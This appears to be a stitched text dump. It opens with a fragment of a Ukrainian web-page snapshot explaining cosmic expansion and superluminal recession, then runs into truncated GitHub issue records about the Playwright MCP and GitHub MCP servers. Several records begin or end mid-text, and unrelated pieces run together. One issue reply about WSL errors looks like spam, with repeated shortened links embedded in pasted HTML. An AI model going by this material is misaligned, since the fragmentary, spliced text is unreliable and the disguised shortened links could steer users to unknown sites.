            Project і High-Z Supernova Search Team виявили, що Всесвіт
            розширюється з прискоренням. Для цього вони тривалий час
            спостерігали за одним й тим самим об’єктом. Результати спостережень
            за далекими галактиками підтвердили, що вони віддаляються. Була
            виміряна швидкість їхнього руху. Через деякий час астрофізики
            повернулись до спостереження за цими об’єктами і зафіксували, що
            вони стали віддалятись ще швидше.
        - paragraph [ref=s2e116]: Але як саме відбувається це розширення? Астрофізики
            часто кажуть, що віддалені від нас регіони Всесвіту продовжують
            віддалятись із надсвітловою швидкістю. Але чи означає це, що якісь
            об’єкти у космосі здатні порушити один з ключових принципів
            сформульованої Альбертом Ейнштейном Спеціальної теорії відносності
            щодо того, що жоден об’єкт у Всесвіті не може перевищити швидкість
            світла.

        - paragraph [ref=s2e121]: Так, частинки, що не мають маси, у вакуумі можуть
            рухатись зі швидкістю світла. Тоді як всі інші об’єкти з певною
            масою де інде, або ті ж частинки без маси, однак у певному
            середовищі, завжди рухатимуться зі швидкістю, нижчою за швидкість
            світла.
        - paragraph [ref=s2e122]: За оцінками астрофізиків, вік Всесвіту складає близько
            13,8 млрд років. Наразі науковці вже можуть виміряти не тільки
            нинішню швидкість розширення Всесвіту, а й те, якою вона була у
            далекому минулому та в усі проміжні періоди. До прикладу, світло від
            об’єкта, що перебував на відстані 100 метрів від нас на момент
            Великого вибуху, дісталось б до нас лише через 13,8 млрд років, тоді
            як сам об’єкт вже перебував би на відстані у понад 46 млрд світлових
            років.

        - paragraph [ref=s2e131]: Але чи означає це, що простір розширився із надсвітловою
            швидкістю? Власне, ні, адже розширення Всесвіту не відбувається із
            якоюсь конкретною швидкістю, а скоріше з відповідним ступенем, що
            вимірюється у швидкості на одиницю відстані. Зазвичай це розширення
            вимірюють у кілометрах в секунду на мегапарсек (км/(с·Мпк)), де
            мегапарсек — це близько 3,26 млн світлових років. У такому разі,
            якщо швидкість розширення складає 70 км/с/Мпк, то об’єкт на відстані
            5 Мпк віддаляється відносно нас зі швидкістю 350 км/с, 100 Мпк — зі
            швидкістю 7 тис. км/с, а у випадку з об’єктом, розташованим на
            відстані 10 тис. Мпк, нам здаватиметься, що він віддаляється зі
            швидкістю у 700 тис. км/с.

        - paragraph [ref=s2e152]: З цього не витікає, що якісь об’єкти можуть рухатись із
            надсвітловою швидкістю. Спеціальна теорія відносності постулює, що
            два об’єкти в одному просторово-часовому відрізку, тобто, які
            займають один і той же простір в один і той самий час, не можуть
            рухатись один відносно одного з надсвітловою швидкістю. Навіть як
            один з них рухатиметься на північ зі швидкістю 99% від швидкості
            світла, а другий — на південь із тією самою швидкістю, їхня
            швидкість не буде дорівнювати 198% швидкості світла відносно одне
            одного, а буде дорівнювати 99,995% швидкості світла. І це не
            важливо, як швидко рухатиметься кожен з них, вони ніколи не зможуть
            перевищити швидкість світла відносно один одного.
        - paragraph [ref=s2e153]: Це і є те, що називають відносністю. Вона вимірює
            відносний рух між двома об’єктами в одній точці простору-часу. Однак
            Спеціальна теорія відносності описує правила для статичного
            простору, що не розширюється, і лише випадки прямолінійного,
            рівномірного руху.
        - paragraph [ref=s2e159]: Водночас Загальна теорія відносності вже містить факт
            розширення простору та усі нелінійні випадки руху. Вимірявши
            кількість звичайної (баріонної) матерії, темної матерії, темної
            енергії, нейтрино, випромінення та світла, яке надходить до нас з
            різних кінців видимого Всесвіту, зміщуючись у червоний спектр
            внаслідок розширення простору, науковці можуть відтворити розміри
            Всесвіту у будь-який момент минулого.

        - paragraph [ref=s2e164]: Вже за секунду після Великого вибуху розміри Всесвіту
            складали 10 світлових років, а через рік — 100 тис. світлових років.
            Однак ніколи жодна частинка при цьому не рухалась з надсвітловою
            швидкістю відносно іншої.
        - paragraph [ref=s2e165]: Розширювався сам простір між частинками, відстань між
            ними збільшувалась, а довжина хвилі у просторі розтягувалась. І все
            це тривало мільярди років і триває зараз, та навіть з прискоренням.
            Навіть якщо ми будемо рухатись зі швидкістю світла, ми ніколи не
            досягнемо об’єктів, що перебувають від нас на відстані далі 15,6
            млрд світлових років, оскільки сам простір між об’єктами продовжує
            розширюватись. На думку багатьох фізиків, рушійною силою цього
            розширення є саме енергія вакууму, яка ніби розштовхує простір та
            прискорює галактики, що віддаляються від нас.

            недосяжним. А це близько 95% обсягу видимої нам частини Всесвіту.
        - paragraph [ref=s2e192]: Якби людство прямо зараз почало досліджувати космос,
            рухаючись зі швидкістю світла, воно змогло б досягти всіх галактик у
            цих межах. Однак це не більше 4-5% від поточного видимого Всесвіту.
            Щороку близько 160 млрд зірок, яких вистачить для утворення однієї
            невеликої галактики, віддаляються від Землі на недосяжну відстань.

When running E2E test with Playwright, test may failed for many reasons. QA team has to run test manually, read trace viewer to debug, update code and loop process until fix all. It may boost QA team performance if this process is automatic.

### Use case

Automatically debug Playwright test.

1. Input: Current version of Playwright code (or better, natural language test plan).
2. Action: Loop until pass all tests
  - Agent run tests
  - If test failed:
    - Read trace
    - Update Playwright code
3. Output: New version of Playwright code that pass all the tests."

microsoft/playwright-mcp,2978640320,146,SSE Connection Timeout When Using MCP Clients (Python UV SDK & TypeScript @modelcontextprotocol/sdk),closed,2025-04-08T05:33:34Z,2025-04-08T12:15:47Z,[],Sayuksh,"When attempting to connect a private client (using either the Python UV SDK or the Node.js @modelcontextprotocol/sdk) to a locally running Playwright MCP server via the Server-Sent Events (SSE) transport, the connection consistently times out.

The Playwright MCP server is running locally and confirmed accessible via direct HTTP requests (e.g., using requests in Python or fetch in Node.js).

The timeout occurs during the initial SSE handshake.

No error logs or specific stack traces appear; the connection stays until timeout.

Steps to Reproduce

Start the Playwright MCP server locally:

npx @playwright/mcp@latest --port 8931

Attempt connection from Python or Node.js MCP client:

Python example:

async with sse_client(""http://localhost:8931/sse"") as streams:
    async with ClientSession(streams[0], streams[1]) as session:
        await session.initialize()

Node.js example:

const client = await createClient({
  url: ""http://localhost:8931/sse"",
  transport: 'sse',
});

Observe timeout behavior (after ~5-15 seconds).

Expected Behavior

The MCP client connects successfully via SSE transport, completes the handshake, and is able to invoke tools (e.g., navigating to URLs, extracting text).

Actual Behavior

The connection consistently times out without detailed error information.

Environment

OS:  macOS

Python UV SDK Version: [latest]

One option is MCP server's command line argument like `--trace <path>`.

Another option is MCP commands like `start_trace()` and `save_trace(path)`.

I think the first option is simpler, but it keeps overrides the same file. For our use case, it's ok because we invoke a new MCP server for every session, but for most of the use cases, the commands' option might be better.

Any thought?

I've been through the code but I don't think it is supported yet, am I right?

The reason I'm looking for that feature is that I would like to avoid to mess with my main profile, and have a configured profile for automation purposes.

For a few projects I need older node versions to build my Azure DevOps Pipelines projects (Node 10, 16, 20).

When trying to run the MCP server I hit the following error when on an older version than v22:

```

So, the MCP server works when I run code as follows:

```
fnm use v22

But when I run an older version the mcp server won't start. Ideally the documentation would include content on how to ensure it runs with the right npx/npm version for these kinds of scenarios."

### Problem
When using Playwright with Chrome, it's looking for the browser at ""C:\Users\user\AppData\Local\Google\Chrome\Application\chrome.exe"" instead of ""C:\Program Files\Google\Chrome\Application\chrome.exe"" directory where Chrome is actually installed.

### Error Message
Error: browserType.launchPersistentContext: Chromium distribution 'chrome' is not found at C:\Users\user\AppData\Local\Google\Chrome\Application\chrome.exe
Run ""npx playwright install chrome""


### Expected Behavior
Playwright should either:
1. Check multiple common installation locations for Chrome
2. Provide a simpler way to configure custom browser paths
3. Use the system's default browser without requiring specific paths

### System Information
- OS: Windows
- Chrome Location: Program Files directory
- Playwright version: 0.0.9

### Possible Solutions
1. Add support for detecting Chrome in Program Files
2. Improve documentation on how to set custom browser paths
3. Add a configuration option to specify browser paths more easily"

microsoft/playwright-mcp,2962013954,101,Browser in playwright-mcp defaults to UTC timezone regardless of OS timezone settings,closed,2025-04-01T02:18:22Z,2025-04-01T02:47:11Z,[],yuga-hashimoto,"## Problem
When using playwright-mcp, the browser environment consistently defaults to UTC timezone, regardless of the host OS timezone settings. This causes discrepancies in date/time inputs and displays in applications that rely on the browser's timezone.

## Reproduction Steps
1. Set OS timezone to a non-UTC timezone (e.g., Asia/Tokyo - UTC+9)
2. Verify OS timezone with `date` command: Shows correct local time
3. Launch browser using playwright-mcp
4. Navigate to a page with date/time inputs or displays
5. Observe that dates/times are processed according to UTC, not the OS timezone

## Example Scenario
- When inputting ""2025-04-01"" as a date in JST timezone (UTC+9)
- The application processes and displays it as ""2025-04-02"" because:
  - Browser is in UTC timezone
  - The application converts UTC to JST, adding 9 hours
  - This causes the date to roll over to the next day

## Expected Behavior
The browser should respect the host OS timezone settings or provide an option to specify the timezone in the playwright-mcp configuration.

## Additional Information
- OS: macOS 15.3.2（24D81）
- playwright-mcp version: latest
- This issue affects any web applications that rely on browser timezone settings for date/time calculations and displays

## Impact
This issue affects user experience in internationalized applications where timezone-sensitive operations are performed, especially those involving scheduling, event planning, or time-based workflows."

Running multiple steps in one call requires the llm to have prior knowledge of the refs. But there is a problem with current setup. 

- After each tool run, a new snapshot is created. It makes it hard for AI to track the ref increments ahead of time. 
Here is an example call: 

```json
{
  ""test_cases"": [
    {
      ""definition"": ""Simplified batch test with key tools"",
      ""steps"": [
        {
          ""name"": ""browser_navigate"",
          ""params"": {
            ""url"": ""data:text/html,<html><title>Simple Batch Test</title><button id='btn1'>Click Me</button><select id='sel1'><option value='1'>One</option><option value='2'>Two</option></select><input type='text' id='input1' value='Initial text'/></html>""
          }
        },
        {
          ""name"": ""browser_click"",
          ""params"": {
            ""element"": ""Button"",
            ""ref"": ""s2e4""
          }
        },
        {
          ""name"": ""browser_select_option"",
          ""params"": {
            ""element"": ""Dropdown"",
            ""ref"": ""s3e5"",
            ""values"": [""2""]
          }
        },
        {
          ""name"": ""browser_snapshot"",
          ""params"": {}
        }
      ]
    }
  ]
}
```
As you can see the refs need to be incremented but mcp client is not fully aware of this so this can easily fail. 

Possible solutions: 

- Add an optional CSS selector to snapshot tools 

or 

- Add a batch mode where snapshots are taken only after all the tools in a batch call have ran successfully. (I think this approach is better) 


I think this feature helps a lot with AI driven E2E tests.

microsoft/playwright-mcp,2957670281,80,--vision flag is not being passed to MCP Server,closed,2025-03-29T02:32:56Z,2025-03-29T17:56:38Z,[],m2rads,"I tried to use the MPC server in vision mode but seems like it continues running it in snapshot mode.

<img width=""662"" alt=""Image"" src=""https://github.com/user-attachments/assets/87d90a97-e753-4144-8bb1-175f00fd5cbe"" />

Looking at code I see that the vision flag is not being passed to the MCP server here: 

```typescript
const server = createServer({
        userDataDir: options.userDataDir ?? await userDataDir(),
        launchOptions,
      });

I believe the vision flag should be passed like this: 

```typescript
const server = createServer({
        userDataDir: options.userDataDir ?? await userDataDir(),
        launchOptions,
        vision: !!options.vision
      });
```

Also noticed that the `fixtures.ts` does not include `--vision` flag and does not test the server with --vision flag turned on. 

```typescript
      server = new MCPServer('node', [path.join(__dirname, '../cli.js'), '--headless', '--user-data-dir', userDataDir], options);
```

This is my proposed fix but it would require additional modification to the tests in `basic.spec.ts`. 

```typescript
 server = new MCPServer('node', [
        path.join(__dirname, '../cli.js'),
        '--headless',
        '--user-data-dir', userDataDir,
        '--vision'
      ], options);
```

If you guys see fit I would like to tackle this issue. 

Thank you.

## Overview

We'd like to create a standardized enterprise deployment blueprint for Playwright MCP to help increase adoption among enterprise users. This blueprint would be completely free, open-source, and require minimal involvement from the project maintainers.

## What We're Offering

[wirtual.dev](https://wirtual.dev) is creating standardized deployment blueprints for leading open-source AI applications. We'd like to create one for Playwright MCP that would:

- Package Playwright MCP as a standardized blueprint for one-click enterprise deployment
- Add enterprise-grade security controls and governance
- Integrate with a shared context layer for interoperability with other AI applications
- Provide a secure environment for customization and extension

## Value to Playwright MCP

This blueprint would:

1. **Increase enterprise adoption** by removing deployment complexity barriers
2. **Enhance security posture** for browser automation in enterprise environments
3. **Simplify configuration management** for both Snapshot and Vision modes
4. **Standardize user data directory management** across enterprise deployments
5. **Enable seamless integration** with other AI tools in enterprise environments

## What We Need From You

- Permission to create this open-source blueprint for Playwright MCP
- Optional: Any guidance on deployment best practices not already in documentation
- Optional: Review of the blueprint when complete (though not required)

## Important Assurances

- The blueprint will be completely **open-source** under the same license as Playwright MCP
- There is **no vendor lock-in** - users can deploy without our platform if desired
- The project **remains independent** - this is simply an additional deployment option
- No changes to the core codebase are needed

## Project Alignment and Contribution Process

We're reaching out before beginning work to ensure our blueprint aligns with your project's vision and contribution standards. This approach helps us:

1. Confirm the blueprint would be welcomed by the project maintainers
2. Understand any specific requirements or preferences you might have
3. Establish clear expectations about the review and merging process
4. Ensure we're not duplicating efforts already underway

## Next Steps

If you're open to this collaboration, we'd appreciate:

1. Confirmation that this type of contribution would be welcomed
2. Any specific guidance on how you'd prefer we submit the final work (PR process, review expectations, etc.)
3. Indication of any aspects of the proposal that need adjustment to better align with your project

We're happy to answer any questions or address any concerns you might have before proceeding.

Thank you for considering our proposal!"
microsoft/playwright-mcp,2956283992,73,incorporate computer use agent,closed,2025-03-28T14:07:45Z,2025-03-28T18:25:01Z,[],willer,"Right now in testing, my main AI is running out of context quickly, because in my development/QA use case, I have to use screenshots (even in snapshot mode) to make sure the page is working correctly, and because the AI is doing all the thinking and work, it keeps all these images in context. I think to make this work properly, it really needs the ability to treat playwright MCP as a sub-agent, or have a sub-agent call it.
One way to do this is to implement a CUA tool, maybe literally OpenAI's Computer Use Agent example, as a tool call. 

The tools might look like:
agent_start(ai_instructions) -> returns session guid
agent_status(session_guid, wait_seconds=3) -> returns working/completed/error/etc. and waits to poll again
agent_log(session_guid) -> returns the full log once it's done
agent_end(ai_instructions)

I had implemented this before and had to do it in pieces like this because the CUA operations can take a while, causing a MCP call timeout.

Another way to do this would be a whole separate agent MCP that calls playwright MCP as a tool, but the downside with that is the agent mode and direct control mode can't share the same session. I think it's preferable to have CUA in scope of this MCP server."

1. Run the MCP server.
2. Have the client retrieve the list of available tools using http call.
3. Forward the tools list to an LLM.
4. Invoke tools using http calls on the server based on requests from the client (triggered by LLM tool calls).

Approaches Tried:
1. Using `npx playwright run-server`
    - This successfully starts the server and sets up a WebSocket connection.
    - However, when sending a ""tools/list"" request from the client, it throws the following error:
`Target page, context or browser has been closed`

2. Using Custom Transports
    - Implemented a custom transport and attempted to send: `server.request({ method: 'tools/list' });`
    - The request does not return any registered tools.

Expected Behavior:
- The server should return a list of registered tools when queried via ""tools/list"".

Actual Behavior:
- Either an error (Target page, context or browser has been closed) or an empty response.

microsoft/playwright-mcp,2951140533,46,Error invoking tools from Claude code in WSL #43,closed,2025-03-27T01:13:22Z,2025-03-28T18:35:23Z,[],digitalusman99,"It looks like you're trying to run Claude Code with Playwright's MCP (Multiprocess Communication Protocol) to navigate a browser in [WSL](<html>
<body>
<!--StartFragment-->
https://url-shortener.me/TB8+
--


<!--EndFragment-->
</body>
</html>) (Windows Subsystem for Linux). However, you're encountering an error when calling browser_navigate.

How It Works
Playwright MCP Setup

You configure an MCP server in Claude Code to communicate with Playwright.

The command npx @playwright/mcp@latest --headless runs Playwright in headless mode.

Calling browser_navigate

browser_navigate is a tool for Playwright to open a webpage.

It attempts to load ""http://localhost:3000/"".

Error: ""undefined""

This suggests that Playwright is failing to process the navigation command.

The issue could be related to WSL networking, Playwright installation, or environment variables.

How to Debug and Fix It
1. Check if Playwright MCP is Running Correctly
Run the following command inside your WSL terminal:
`npx @playwright/mcp@latest --headless
If it fails, you might need to reinstall Playwright:
`npm install -g @playwright/mcp
`
[<html>
<body>
<!--StartFragment-->
https://url-shortener.me/TB8+
--


<!--EndFragment-->
</body>
</html>](url)
2. Verify WSL Network Access to localhost:3000
Since your node app is running in WSL, try accessing it:
`curl http://localhost:3000/
`
If you see a response, the server is running correctly.

If you get an error, ensure your Node.js app is properly started and listening on all interfaces (0.0.0.0):
`app.listen(3000, '0.0.0.0', () => console.log(""Server running""));
`
3. Try Explicitly Setting an Environment Variable for Playwright
Your configuration has an empty env object. Try updating it:
`""env"": {
  ""DEBUG"": ""pw:api""
}
`
4. Run in Non-Headless Mode for Debugging
Modify the Playwright command to remove --headless:
`""args"": [
  ""@playwright/mcp@latest""
]
`
This lets you see the browser's behavior [when](<html>
<body>
<!--StartFragment-->
https://url-shortener.me/TB8+
--


<!--EndFragment-->
</body>
</html>) navigating to localhost:3000.

Final Steps
Restart the Playwright MCP process.

Ensure your Node.js app is accessible from WSL.

Try running browser_navigate again."

Despite running `npx playwright install chrome` and trying various configuration options (including headless mode and environment variables), the MCP server continues to look for Chrome at the user-specific AppData path rather than the system installation or Playwright's managed browser installations.

Error: Cannot find module './lib/program' Require stack:
•	/path/to/cli.js

The root cause is that `cli.js` tries to require the built JS file from `lib/program.js`, which does not exist unless the TypeScript has been compiled.

---

## Solution

This line in `cli.js`:

```js
require('./lib/program');

```
will only work after running:
```bash
npm run build

```
If you're using it in a development setup without a build step, it may help to directly refer to src/program.ts or improve the documentation to clarify this step.


# WSL Success Report
I successfully ran playwright-mcp on WSL2 (Ubuntu) and connected it to Claude Desktop using the MCP server interface.

Here’s how I got it working:
1.Inside WSL:
```bash
git clone https://github.com/microsoft/playwright-mcp.git
cd playwright-mcp
npm install
npx playwright install
npm run build
```
2.Then I configured Claude Desktop’s mcpServers like so:
```json
{
  ""mcpServers"": {
    ""playwright-mcp-wsl"": {
      ""command"": ""wsl"",
      ""args"": [""bash"", ""-ic"", ""node /home/<your-username>/mcp/playwright-mcp/cli.js""]
    }
  }
}
```
3.Claude was able to detect the tools such as browser_navigate, browser_click, browser_save_as_pdf, and I successfully generated a PDF from a webpage and copied it from /tmp to my Windows D: drive using:
```bash
cp /tmp/page-....pdf /mnt/d/
```
# Environment
- OS: Windows 11 + WSL2 (Ubuntu)
- Node.js: v20.19.0
- playwright-mcp version: 0.0.2
- Claude Desktop (MCP integration)

Thank you for this amazing tool!

microsoft/playwright-mcp,2948224997,23,Feature Request: Allow setting cookies and userAgent when opening browser,closed,2025-03-26T02:27:30Z,2025-03-28T18:36:28Z,[],Sylvenas,"**Description**
It would be helpful to have the ability to set cookies and userAgent when opening a new browser instance through the MCP API. This would enable better control over browser behavior and allow for testing scenarios that require specific cookie states or custom user agents.

**Use Cases**
1. Testing authentication flows with pre-set cookies
2. Simulating different devices and browsers using custom user agents
3. Maintaining session state across browser instances
4. Testing website behavior with different cookie configurations

**Proposed Solution**
Add new parameters to the browser navigation command:

```typescript
interface BrowserNavigateOptions {
  url: string;
  cookies?: {
    name: string;
    value: string;
    domain?: string;
    path?: string;
    // other cookie properties
  }[];
  userAgent?: string;
}
```

**Benefits**
- Improved testing capabilities
- Better simulation of real-world scenarios
- More control over browser behavior
- Reduced need for manual cookie/userAgent setup

**Implementation Notes**
- The implementation could leverage Playwright's existing context.addCookies() and context.setUserAgent() methods
- Cookie validation should follow standard web cookie specifications
- Default behavior (no cookies/userAgent specified) should remain unchanged"

While rough, it was even able to analyze a page, create a basic model, then generate some test scenarios based off it. 

Two things I've noticed:
- There's no way to specify a browser. Since most of my tests run on Chromium, I want to use that but it always defaults to the Chrome app, and is really slow for some reason. It would be nice if there was a way to specify which browser I want explicitly here, and be able to use the same browser/versions as the ones used in test runs. This is similar to #13 .
- It would be nice if there is a way to open with a specific storage state, leveraging the auth json files generated from auth setups. I have several that are specified on a per-testfile basis and am not sure if there's a way to load using one of the storage states.

I built a playwright-mcp server(https://www.npmjs.com/package/playwright-mcp) which allows you to record interactions on the webpage and expose it as context to the MCP clients which can use LLM to help generate playwright testcase easily.

   ```
   npx playwright@latest run-server
   ```
   Output:
   ```
   Listening on ws://localhost:59985/
   ```

2. Configure MCP client with the following:

         }
       }
     }
   }
   ```

3. Attempt connection; observe the version mismatch error.

**Expected behavior:**
Successful connection without version mismatch error.

**Workaround Attempted:**
Pinning both server and client explicitly to the same version (`v1.51` or `v1.52`) does **not** resolve the issue.

**Environment:**
- Playwright MCP client version: `v1.52`
- Playwright server version: `v1.51`
- OS/environment details (optional): [Add if relevant]

**Suggested Fix:**
Investigate internal compatibility handling or provide explicit documentation on resolving server-client mismatches beyond simple version pinning.

Add a test case to verify system behavior when attempting checkout without a username in the session. This is an edge case that should be handled gracefully by the system.

## Test Scenario
1. Access the checkout flow directly without logging in
2. Attempt to complete checkout without user session
3. Verify appropriate error handling and user redirection

## Acceptance Criteria
- [ ] Test verifies that checkout cannot proceed without a username
- [ ] Test confirms user is redirected to login page
- [ ] Test validates appropriate error message is displayed
- [ ] Test ensures cart contents are preserved after login redirect
- [ ] Test follows existing test structure and uses Page Object Model

## Additional Context
- This test case will help improve system security and user experience
- Should be added to the existing suite of checkout tests
- Will help prevent unauthorized access to checkout functionality

## Implementation Notes
- Use TestNG data provider pattern consistent with existing tests
- Implement in `CheckoutTest.java` using Page Object Model
- Add appropriate test data in TestData.xlsx
- Follow existing error handling and logging patterns

The GitHub OAuth consent page has no org picker or scope prompt, so there’s no obvious way to grant org-level project access.

**Steps to reproduce**

1. Add/connect the official GitHub MCP server via OAuth (remote, not self-hosted).
2. Attempt an org Projects v2 action (e.g., list org projects or add/read a project item).
3. Receive 403.

github/github-mcp-server,3558940502,1322,Add ability to reply to individual pull request review comments,closed,2025-10-27T22:50:33Z,2025-10-27T22:51:10Z,[],rhythmatician,"### Describe the feature or problem you'd like to solve

Currently, the GitHub MCP Server doesn't provide a way to reply directly to individual pull request review comment threads. When Copilot or other reviewers leave inline comments on a PR, there's no way for an AI agent to respond to those specific threads - only to create new general PR comments or start new reviews.

This makes it difficult to have threaded conversations about specific code review feedback, which is a core GitHub workflow pattern.

### Proposed solution

Add a new tool/method to reply to existing review comment threads, similar to GitHub's REST API endpoint:
```
POST /repos/{owner}/{repo}/pulls/comments/{comment_id}/replies
```

This would enable AI agents to:
- Respond directly to review feedback in-thread
- Acknowledge and explain how comments were addressed
- Ask clarifying questions about specific review suggestions
- Maintain conversation context at the code level

**Suggested tool signature:**
```typescript
reply_to_review_comment({
  owner: string,
  repo: string,
  comment_id: number,  // The review comment ID to reply to
  body: string         // Reply text (supports markdown)
})
```

### Example prompts or workflows (for tools/toolsets only)

**1. Addressing Code Review Feedback**
> ""Reply to each of Copilot's review comments explaining how I addressed them""

Agent reads review comments, checks commits, then replies to each thread:
- Comment r2467180584 → ""✅ Addressed in commit a4622b9 by adding threading.Lock...""
- Comment r2467180592 → ""✅ Added clear_jwks_cache() public API...""

**2. Requesting Clarification**
> ""Ask the reviewer to clarify what they mean in comment r2467263520""

Agent replies: ""Could you provide an example of the preferred import structure? Should all typing imports be grouped together or mixed with standard library?""

**3. Acknowledging and Deferring**
> ""Acknowledge the performance concern in comment r2467180578 but explain we'll address it in a follow-up PR""

Agent replies: ""Good catch! This is a valid concern. Created Issue #150 to track adding connection pooling. Will address in next sprint.""

**4. Batch Response to Review**
> ""For each unresolved review comment, reply with the commit that fixed it""

Agent iterates through review comments, checks git history, replies to each with specific commit SHA and explanation.

**5. Interactive Code Review Dialogue**
> ""If the reviewer suggests an alternative approach in any comment, ask them to elaborate""

Agent reads review, identifies suggestions, replies asking for examples or rationale.

### Additional context

**Current Workaround:**
Right now we have to add a single general PR comment listing all responses:
```markdown
## Review Comment Responses

### Comment r2467180584
✅ Addressed by adding threading.Lock

### Comment r2467180592  
✅ Added public API clear_jwks_cache()
```

This works but loses the threaded context and makes it harder for reviewers to track which specific code lines are being discussed.

**GitHub API Reference:**
- [Create a reply for a review comment](https://docs.github.com/en/rest/pulls/comments?apiVersion=2022-11-28#create-a-reply-for-a-review-comment)
- Endpoint: `POST /repos/{owner}/{repo}/pulls/comments/{comment_id}/replies`

**Real-world use case:**
I just addressed 5 Copilot review comments in https://github.com/Johnson-Gage-Inspection-Inc/core-api/pull/145 and wanted to reply to each thread individually, but had to work around the limitation.

**Benefits:**
- ✅ Maintains conversation context at code level
- ✅ Enables proper GitHub code review workflow
- ✅ Makes review/response history easier to follow
- ✅ Integrates with GitHub's notification system
- ✅ Allows AI agents to participate fully in code review discussions"
github/github-mcp-server,3554366432,1314,Docker MCP Toolkit OAuth integration returns 403 on write operations,open,2025-10-26T19:39:05Z,2025-10-26T19:39:05Z,[],dpearson2699,"## Environment

- **Server**: GitHub Official MCP Server (`ghcr.io/github/github-mcp-server`)
- **Deployment**: Docker MCP Toolkit (via Docker Desktop)
- **Authentication**: OAuth (managed by Docker Desktop)
- **Image SHA**: `sha256:d19eec1424deda61e563a35585e6993631e5d6342a652f8b467512fcef363687`

## Issue

When using the GitHub Official MCP Server through Docker MCP Toolkit with OAuth authentication, all write operations fail with 403 errors despite successful authentication. Read operations work correctly.

## Steps to Reproduce

1. Install GitHub Official MCP Server via Docker MCP Toolkit in Docker Desktop
2. Authenticate using Docker's OAuth flow (browser-based consent)
3. Attempt to create an issue comment using `github_add_issue_comment`

**Result**: 
```
POST https://api.github.com/repos/{owner}/{repo}/issues/{issue_number}/comments: 403 Must have admin rights to Repository.
```

## Expected Behavior

OAuth tokens should include necessary scopes for standard write operations (creating issues, adding comments, etc.) that don't require admin access.

## Actual Behavior

- Read operations succeed (getting issues, listing repositories, reading comments)
- Write operations fail with 403 ""Must have admin rights to Repository""
- Authentication is working (no 401 errors)
- The OAuth token appears to have read-only scopes

## Comparison

Running the same GitHub Official MCP Server locally (npm install + OAuth) works correctly with full read/write access using the same API endpoints. This suggests the issue is specific to the OAuth token scopes provided through Docker's OAuth integration.

## Additional Context

This only affects the official server distributed via `ghcr.io/github/github-mcp-server`, not the archived MCP server from modelcontextprotocol. The issue appears to be with how Docker Desktop's OAuth flow provisions tokens for this server - possibly requesting insufficient scopes or using a different OAuth application configuration than the standalone installation."

Add a Django management command to the `datalab_connector` app so operators can trigger conversions or cleanup outside the REST API. The command should mirror the existing Celery tasks (single document, tag batch, document-type batch, and cleanup) while validating configuration flags and connector state.

## Required changes
- Introduce `src/datalab_connector/management/commands/datalab_connector.py` with mutually exclusive options:
  - `--document-id=<id>` to queue a specific document conversion
  - `--tag-id=<id>` to batch queue by tag (requires `enable_category_calls`)
  - `--document-type-id=<id>` to batch queue by document type (requires `enable_type_calls`)
  - `--cleanup-days=<days>` to invoke existing `cleanup_old_calls`
  - `--force` to override existing conversions where allowed
  - `--dry-run` to report intended actions without enqueueing tasks
- Reuse `DatalabConnectorConfig.get_config()`, `DatalabCall.can_create_call`, and existing Celery tasks for execution. Provide clear CLI feedback for disabled/invalid states and return non-zero exit status on failures.
- Add unit tests in `src/datalab_connector/tests/test_management_command.py` covering:
  - Queuing a document conversion
  - Override rejection when `allow_override` is false
  - Tag/type batch gating by configuration flags
  - Cleanup path and dry-run behavior
  - Error cases (missing required argument, connector disabled)
- Update `src/datalab_connector/README.md` (and relevant docs) with usage examples (`python manage.py datalab_connector --document-id 123`) and notes about Celery worker requirements.

## Testing
- `pytest src/datalab_connector/tests/`

The runner client entrypoint at `src/runner-client/index.ts` re-exports `registerRunnerClientModule` from `./register.js`, but there is no corresponding `register.ts`/`register.js` file in the repository. When a consumer imports from this entrypoint, module resolution fails because the re-exported file cannot be found.

## Steps to Reproduce
1. Clone the repository (or install the package) at the latest `main`.
2. Attempt to import `registerRunnerClientModule` via `import { registerRunnerClientModule } from ""./src/runner-client/index.js""`.
3. Node resolves `./register.js` from that entrypoint and throws `ERR_MODULE_NOT_FOUND: Cannot find module './register.js'`.

## Expected Behavior
The entrypoint either provides the missing `register.js` implementation or stops exporting it.

## Actual Behavior
Any consumer that imports `registerRunnerClientModule` hits a runtime module resolution error. Downstream we had to comment out the re-export and leave a `FIXME` to keep our tests passing.

## Notes
Observed on 2025-10-16 while integrating the runner client into our MCP tooling. Happy to help validate once the missing file is added or the export list is adjusted."

**Setup:**
- Using Claude Desktop with custom OAuth app (client ID + secret)
- OAuth app is approved at organization level
- Token has `repo` and `read:org` scopes
- Organization shows as authorized
- GitHub Enterprise with Managed Users (EMU)

**Current behavior:**
- Can successfully access personal private repositories
- Cannot see any organizations or organization repositories
- When asking Claude to list organizations or teams, it returns none

**Question:**
Is there additional configuration needed for the remote MCP server to properly access organization repositories when using custom OAuth app credentials? Or does the remote server only support organization access through its built-in OAuth flow or PAT authentication?

The OAuth flow completes successfully with all requested scopes granted, but the MCP server appears unable to access organization data despite the token having the necessary permissions.

github/github-mcp-server,3475631931,1169,Feature Request: Expose GitHub Project Item History/Timeline Events,open,2025-10-02T00:59:40Z,2025-10-02T00:59:40Z,[],davinchia,"## Problem Statement

Currently, the GitHub MCP server provides tools to view the current state of GitHub Project items (issues/PRs in projects), but there's no way to access the historical data about when items moved between columns or how long they spent in each status.

This limits the ability to:
- Track cycle time metrics (time from ""In Progress"" to ""Done"")
- Understand bottlenecks in workflows
- Generate velocity and throughput reports
- Analyze team performance over time

## Use Case

As a user working with GitHub Projects, I want to be able to ask questions like:
- ""How long did issue #14560 spend in each column of the Move project board?""
- ""What's the average time issues spend in 'Review/QA' status?""
- ""Show me the timeline of when this issue moved between statuses""

## Current Behavior

The `get_project_item` and `list_project_items` tools only return the current state of items, including their current field values. There's no historical tracking exposed through the MCP server.

## Proposed Solution

Add new tool(s) to expose GitHub Project item timeline/history events. This could be:

### Option 1: New dedicated tool
```typescript
get_project_item_history({
  owner: string,
  owner_type: 'user' | 'org',
  project_number: number,
  item_id: number
})
```

Returns an array of events showing when the item was:
- Added to the project
- Moved between columns/status values
- Field values were changed
- Removed from the project (if applicable)

Each event should include:
- Timestamp
- Field that changed (e.g., ""Status"")
- Previous value
- New value
- Actor (who made the change)

### Option 2: Enhance existing tools
Add an optional `include_history` parameter to `get_project_item` that when set to `true`, includes the historical events alongside the current state.

## GitHub API Support

GitHub's ProjectV2 API supports querying project item events through GraphQL. Example query:

```graphql
query {
  node(id: ""ITEM_NODE_ID"") {
    ... on ProjectV2Item {
      fieldValueByName(name: ""Status"") {
        ... on ProjectV2ItemFieldSingleSelectValue {
          name
          updatedAt
        }
      }
    }
  }
}
```

